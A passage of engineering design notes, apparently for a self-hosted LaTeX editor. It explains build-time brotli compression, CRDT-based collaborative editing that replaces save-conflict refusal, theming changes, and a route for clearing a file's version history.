the agent is not yet configured or the session has expired. Once Claude,
OpenAI or "on my own" has been chosen there is no control anywhere — not in
the settings card, not on the projects screen — for changing it. Section 6
of the tutorial therefore explains how the agent *behaves* and points at the
README for how it was chosen. This is a missing control rather than a
documentation gap, and papering over it in a tutorial would have been the
wrong fix.

## 21. The bundle is compressed once, not on every request

The server was sending 750 kB of JavaScript uncompressed. The obvious fix is
`GZipMiddleware`, and it is the wrong one.

Measured on the real bundle, over a real socket:

| | latency | over the wire |
|---|---|---|
| no compression | 2.3 ms | 750.2 kB |
| gzip middleware, level 9 (Starlette's default) | 40.7 ms | 236.2 kB |
| gzip middleware, level 5 | 22.4 ms | 238.9 kB |
| gzip middleware, level 1 | 11.3 ms | 280.0 kB |
| **precompressed brotli** | **1.6 ms** | **202.2 kB** |

Compressing per request costs about 38 ms of CPU before the first byte
moves, every time. Over loopback that is twenty times the latency of doing
nothing, paid by exactly the people whose link never needed the help. The
crossover is around 100 Mbit/s: below it the smaller transfer pays for the
CPU, above it you are buying nothing with real time. A self-hosted editor
is run on localhost as often as over Tailscale, so no single compression
level is right for both.

Compressing at build time removes the choice rather than splitting it.
`npm run build` writes `.br` and `.gz` beside each asset and
`PrecompressedStatic` hands over whichever the browser asked for. It is
*faster than sending the file uncompressed* -- 1.6 ms against 2.3 -- because
there is less of it to read and write, and it is smaller than anything
worth computing per request.

**Brotli rather than zstd**, on the measurements rather than by reputation:
at build time brotli quality 11 gets the bundle to 202.2 kB where zstd 19
manages 210.5 kB, and brotli has been in every browser for years while zstd
is still missing from Safari. It loses on both size and reach, so there was
no case for it.

The whole thing costs no dependency at either end. Node's `zlib` has brotli
built in, so the compressor is a build step nobody has to install; the
server only reads bytes off disk, so no runtime package either. That
mattered more than it might elsewhere: this is software other people
install, and a mandatory native dependency to save 34 kB would have been a
poor bargain.

Two details that are easy to get wrong and are covered by tests. The
compressed copy is served with the content type of *what it decompresses
to*: a browser handed `application/gzip` downloads the file instead of
running it. And `Vary: Accept-Encoding` goes on every response including
the uncompressed one, or a cache between the browser and here can hand a
brotli body to a client that never asked for one.

## 22. Two people, one file, and the refusal that had to go

This section reverses a decision the app was built around. §"The bugs that
mattered" records that two windows on one project destroyed each other's
work, and the fix: a save carries a tag for what the browser last agreed the
file said, and is *refused* when the file has moved on. That was the right
answer to the problem it was given. It is the wrong answer to a different
one, and this is a record of the difference and of what was deleted.

**Refusing is right when one writer is stale, and wrong when two are
current.** Two tabs belonging to one person are a mistake to be caught: one
of them is behind and its owner does not know. Two people typing at the same
moment are not a mistake at all, and a banner asking which copy survives is
asking somebody to throw away work that nothing was wrong with. No amount of
improving the refusal turns it into an answer for the second case, because
the refusal *is* the answer for the first.

So a file is a CRDT, what is on disk is a projection of it, and the tag, the
banner, `resolveConflict`, the closing-tab beacon and the dirty dot are all
gone. It is worth being clear that this is a deletion and not an addition:
the conflict machinery existed to handle a class of event that no longer
occurs, and leaving it in place beside a merge would have been two answers to
one question.

### Every project, not only the shared ones

The tempting version is to keep the old path for a project nobody has shared
and use documents only when they are needed. That is two save paths with two
conflict semantics and two sets of tests, and the rare one is the untested
one. It is also a worse product: two tabs of your own stop being able to
fight on the day this lands, whether or not anybody else is involved.

### One document per file, not one per project

A project's manifest is one document; each text file is another. One document
for the whole project is the obvious shape and it fails on the first screen:
a two-megabyte thesis with a year of tombstones behind it would be a
multi-megabyte download every time the project opened, and the browser needs
the file you are editing, not all forty. It would also break remote cursors,
because a `y-codemirror.next` relative position only decodes against the
document it was made in.

### Keyed by file id, and where that id comes from

Rename a chapter on one machine while somebody is typing into it on another,
and the text has to land in the same document regardless. So the manifest is
keyed by an id and a path is a *property* of a file.

For a project NextTex has seen before, that id is `history.slug_for(path)` --
the sha16 the version log has always been keyed by. That is not a
coincidence being exploited so much as the same question having the same
answer twice, and it means an existing project keeps its entire history
attached with no migration step at all.

### Presence for display, focus for the agent

Awareness carries cursors, and it would have been easy to make the agent's
"here" and "this" read from it too. That was rejected: it couples the agent
to a JavaScript wire encoding that would then have to be re-implemented in
Python and kept in step for ever. `session.presence` stays a plain dictionary
fed by the editor, and it answers only for *local* clients -- a collaborator
in another time zone must never be able to change what "this paragraph"
means to your agent.

Awareness itself did end up being parsed on the server, for a different and
narrower reason: see the ghost, below.

### What the tests had to be rewritten to say

`tests/api/test_two_tabs.py` and `e2e/specs/two-tabs.spec.ts` were the specs
for the refusal, and inverting them is the honest record of the change: the
test that asserted a stale tab is turned away now asserts that both edits
survive and nobody is asked anything. The browser specs also stopped waiting
for a `PUT /file` response, because there is no save request to wait for; they
poll the file instead, which is what they were using the response as a
stand-in for.

### Five things that cost an hour each

Written down because none of them is discoverable from the outside, and four
of the five fail silently.

**`doc["text"]` returns `None`** for a root type that arrived through
`apply_update` rather than through assignment -- so a document read back from
disk looks empty to anything that indexes it, with no error anywhere.
`doc.get(name, type=T)` answers correctly, and `_root` in `store.py` exists
for this alone.

**An observer runs inside the transaction that fired it**, and pycrdt refuses
a nested one. So nothing in an observer may read the document: persistence is
handed the update bytes rather than deriving them, compaction waits for a
path with no transaction open, and scheduling a write never writes. The error
when this is got wrong -- "Already mutably borrowed" -- names neither the
observer nor the read.

**A joiner asked for no files.** The first version of `send_documents`
offered the documents this install had *open*, and a joiner has none open, so
it received an empty project while the handshake, the membership and the
connection all looked perfectly healthy.

**A collaborator who closed their window stayed for thirty seconds**, caret
and all. y-protocols drops a silent peer after `outdatedTimeout`, which is a
module constant and cannot be lowered. The first design relayed awareness
unread, on the principle that the server should not re-implement somebody
else's wire format; that principle survives, but the conclusion did not,
because pycrdt already implements it. The server keeps an `Awareness` of its
own and says who has gone the moment their socket closes.

**Starlette's HTTP middleware does not run for the websocket scope.** The
check that guards the other ninety routes does not guard the sync route, and
a version of it that forgot would hand every document in every open project
to anyone who could reach the port while looking, on screen, exactly like a
version that did not. `authorise_socket` is called in the handler body and
there is a test whose only job is to notice if it stops being.

### The bundle

`bundle.initial_kb` was 770.3 before any of this and is 773.1 after it,
against a budget of 775 -- which is not free, and is not the whole cost
either. Yjs, `y-protocols` and `y-codemirror.next` are a 102 kB chunk that
`bench.py` does not count, because it counts the entry script and this is
imported when a file is opened. The honest number is that a first
*interaction* got about fifty kilobytes heavier and the first *paint* got
three heavier, and the second is the one the budget is about.

### What is deliberately not solved

Two agents editing the same paragraph at once converge syntactically and not
semantically: the text will be valid LaTeX and may not be sensible prose.

`git pull` replaces a whole file, so it wins against a collaborator's
untouched paragraphs in the same file. Committing and pushing are safe; the
documentation says to pull between sessions rather than during one.

Retention is per peer. Two collaborators may hold different depths of the
same file's history, because thinning is a decision about a local disk and
history syncs by a cursor that only moves forward -- a set difference would
re-offer every record that thinning had just dropped, for ever.

And removing a collaborator disconnects them without retracting anything.
There is no owner, so there is no authority that could rotate a key, and a
button that looked like revocation and was not would be worse than no button.
The sentence saying so is next to the button and not in a footnote.

## 23. A page you can choose, and furniture you cannot

Two axes were added to the theming in one pass, and the second one found
bugs in the first that no amount of looking would have.

### The light theme was a cloud

Four surfaces five L\* apart, all of them light, with the frame only five
points below the panes. The result was one grey field divided by hairlines:
the rail, the editor, the agent column and the surround read as the same
object, and the typeset page — which §1 says is the point of the whole
palette — was no brighter than the panes beside it. The writer's own words
for it were that it looked "completely light everywhere, like a cloud", and
that there should be contrast between the panes and the things in front of
them.

The answer is *furniture*. The rail, the agent column, the status strip, the
diagnostics drawer, the folded rail's spine and every floating card take the
**dark** palette while the theme is light. The editor and the preview stay
light, so the light theme is now a lit editor and a lit page set into dark
furniture.

The mechanism is one selector added to the dark block:

```css
:root[data-theme="dark"],
:root[data-theme="light"] .nx-furniture,
.nx-theme-dark { ... }
```

and nothing else. This works because `@theme inline` keeps the `var()`
indirection inside every compiled Tailwind utility — `bg-surface` in the
bundle is `background-color: var(--surface)` — so a container that
redeclares the palette repaints everything inside it with no component
changes at all.

**Why not a third palette, or a layer of `--chrome-*` tokens.** Both were
considered and both are worse for the same reason. A third palette is three
dozen values that have to be authored, measured, and then kept in step; §2
records twice what happens when two copies of a palette are free to drift.
A `--chrome-*` layer doubles the token count, gives every component a second
vocabulary to choose between, and creates a whole matrix of pairs — `--pen`
on `--chrome-2`, `--error` on `--chrome` — that `contrast.test.ts` has no
curated entries for. Reusing the dark palette creates **zero** new pairs:
every pair already certified for dark holds verbatim.

The new selector goes *before* `.nx-theme-dark`, because `contrast.test.ts`
finds the block by searching for the literal string `.nx-theme-dark {`, and
a selector appended after that one would take the brace with it.

### Three papers for the editor page

`editorTheme` was `match | light | dark`, and "light" meant the proofing
grey. That is the right ground for judging a page and the wrong one for
somebody who has composed on white for twenty years. There are now six
grounds: `match`, `light` (the proofing grey), `white`, `warm`, `cool` and
`dark`. `white` is exactly `#FFFFFF`, because that was the request, and a
near-white pretending to be white is worse than either.

They are **not** three more palettes. Each is applied together with
`.nx-theme-light`, which supplies the inks, the five accents and the five
syntax hues, and moves only the four surfaces upward. That is what makes the
syntax highlighting come with them instead of having to be redrawn, and it
is why `contrast.test.ts` composes them (`{...LIGHT, ...paper}`) rather than
measuring four hexes in isolation.

Two tokens move with the surfaces, and both move opposite to the obvious
direction.

**`--ink-3` gets louder on a brighter page, not fainter.** It measures
6.2:1 on the proofing grey and 7.9:1 on white. Left alone, a comment would
have outranked the prose it annotates, so the papers lift it back to roughly
the weight it was chosen for. This is the only ink they touch: `--ink` and
`--ink-2` merely gain contrast, which is never a fault.

**`--line` is the one thing that genuinely weakens**, and not because of the
ink. It is `color-mix(in oklab, var(--ink-3) 55%, transparent)` — an alpha
mix, so what shows is 55% of the ink over 45% of the ground. Brighten the
ground *and* lighten the ink and the hairline moves two steps toward the
page, taking the gutter rule and the search panel's borders with it. The
papers mix it at 68% to stand still.

### The three bugs the furniture found

**`--on-pen`.** A filled `--pen` button decided its label colour with
`:root[data-theme="dark"] .pen-button { color: var(--surround) }` — it asked
the *root* what theme it was. That is the wrong question inside a subtree,
and it was already latently wrong for a `.nx-theme-dark` editor. The moment
the agent column became furniture it went actively wrong: Send in the light
theme would have been white on `#C988E7` at 2.6:1, in the one control the
agent's entire colour reservation exists for. It is a token now, written as
a literal hex in every palette so the contrast test's regex captures it, and
the selector is gone. This is the `--on-accent` idea from NexusQC, and it
earned its place here for exactly the reason it earned it there.

**Colour inherits as a value, not as the variable.** The project name, the
agent column's heading and several buttons went invisible the instant the
furniture arrived. `color` inherits *resolved*: `body` computes its colour
from the light `--ink` once, and every descendant inherits that dark grey
even inside a subtree that has since redeclared `--ink` for a dark ground.
One line — `.nx-furniture { color: var(--ink) }` — retires the whole class
of it. Anything else handed a palette by a class needs the same line.

**`theme-color` was the wrong token.** The meta tag declared `#121614`, the
dark theme's `--surface`, in both themes. The browser paints its own chrome
with it, so it should be the app's outermost ground and it should follow the
theme. The pre-paint script sets it now.

### The editor ground is offered as a colour

The Settings card used a `Choice` row of words, and words were the problem:
"Light" in that row and "Light" in the Theme row directly above it meant two
different things, which is why every button in a `Choice` carries its group's
name in its accessibility label. Six grounds could not have survived that.

They are swatches, and each is painted by putting the app's own palette class
on the fill and filling with `var(--surface)`. There is no list of preview
hexes here to go stale — the swatch *is* the token. `Match` is drawn as both
palettes at once, split down the middle, because that is what it means, and
a caption names the current choice so the row reads as a sentence rather than
as six grey rectangles to guess between.

## 24. Clearing a file's history, and one registry for what a file is

### Clearing

`DELETE /api/projects/{id}/history?path=` throws away every stored version of
one file. It is the only destructive operation in the history store, so what
it must *not* do is the whole design.

Blobs are content-addressed and therefore shared: with the file's own past,
with any other file that happens to hold identical bytes, and with the final
version recorded for something now sitting in the trash. Nothing in the route
unlinks a blob by name. It drops one log with `History.forget`, then lets
`History.collect` sweep whatever no *remaining* log points at. The
collector's one-hour grace exists to stop it racing a `record` that has
written a blob and not yet its line, so a version made in the last hour
survives the call and goes on the next one — which is why the interface says
disk comes back "within the hour" and must not promise sooner.

The order is forget, re-seed, collect. Collecting first would unlink the blob
holding the file's current contents and the re-seed would immediately write
it back: harmless, but it makes the reported figure a lie.

The re-seed is a floor. Without it the file has no past at all, the panel is
empty, and the next edit has nothing to diff against. It is recorded as
`create`, which is in `PERMANENT_OPS` and therefore never thinned.

**The working file is untouched**, by construction: `forget` only removes
`log/<slug>.jsonl` and the `paths.json` entry, and nothing else in the route
opens the file except to read it for the marker. The confirmation says so
before it says anything else, because "delete version history" beside a file
reads a great deal like "delete the file".

**A peer's copy is not purged.** What a collaborator keeps of this file is on
their disk, and §22 already treats two collaborators holding different depths
of one file's history as correct rather than as a fault.

*Known gap, not fixed here.* `history_sync` cursors are indices into a peer's
own contribution list, and they only ever move forward. After a purge the
local list is length one while a collaborator's cursor still sits at N, so
the next N versions of that file would not be sent. A `HIST_RESET` frame is
the minimal fix and a cursor keyed on the last absorbed timestamp is the
durable one. Neither is in this change.

### One registry for what a file is

There were four answers to "what kind of thing is this file", and they
disagreed. `project.py` has `TEXT_SUFFIXES` and `IMAGE_SUFFIXES`; the
frontend had a `RENDERABLE` set that excluded `.pdf`; `History.tsx` had a
*second* `TEXT_SUFFIXES` including `.bbl`, `.csv`, `.log`, `.py` and `.sh`
where the server's did not; and the file tree asked about `.bib` and `.tex`
with regular expressions written inline.

The visible consequence: a PDF figure was called an image by the server, so
the editor was skipped; refused by the renderer, because `RENDERABLE`
excluded it; and offered as a download in an application that had PDF.js
loaded one column away. Writers keep figures as PDF precisely so they scale,
so the one file this app could not show was the one it was best equipped to.

`frontend/src/panes/file-kinds.ts` is now the single answer, and it has **no
imports and may never gain one**: `History.tsx` imports it statically, and a
static import anywhere keeps the module in the entry chunk — which is what
stopped `FileView` being split out of it before.

The server's sets are deliberately not merged into it. Those decide what the
editor may open, which is a question about bytes on disk and has to be
answered on the server whatever the browser believes; this one decides how to
draw a row and which viewer to reach for. A vitest asserts the containment
that has to hold — every suffix the server will hand over as text is text
here too — so the two can differ without drifting.

### The viewers

`FileView`'s docstring used to say it was "deliberately not a viewer: no
zoom, no pan, no page controls". That call is reversed rather than left to
contradict the code. A figure is not an attachment; it is the object the
writer is judging, and judging it means seeing it at a size they choose.

PDFs go to the preview pane's own viewer, which now takes an optional
`source` URL instead of the build output — the same rasteriser, the same
zoom ladder, the same page controls. Double-click inverse search is inert
when `source` is set: there is no source file behind somebody's figure, and
asking synctex anyway would land the caret on an unrelated line of the main
document.

Images get zoom, fit and their real pixel dimensions, and they are drawn **on
paper**, with the page's own shadow, on the surround. The old viewer centred
them on `--surface-2`, so a plot exported with a transparent background —
which is most of them — was judged against near-black in the dark theme,
where a white axis label simply is not there. Paper is also the honest
preview: white is what transparent will be once it is on the page.
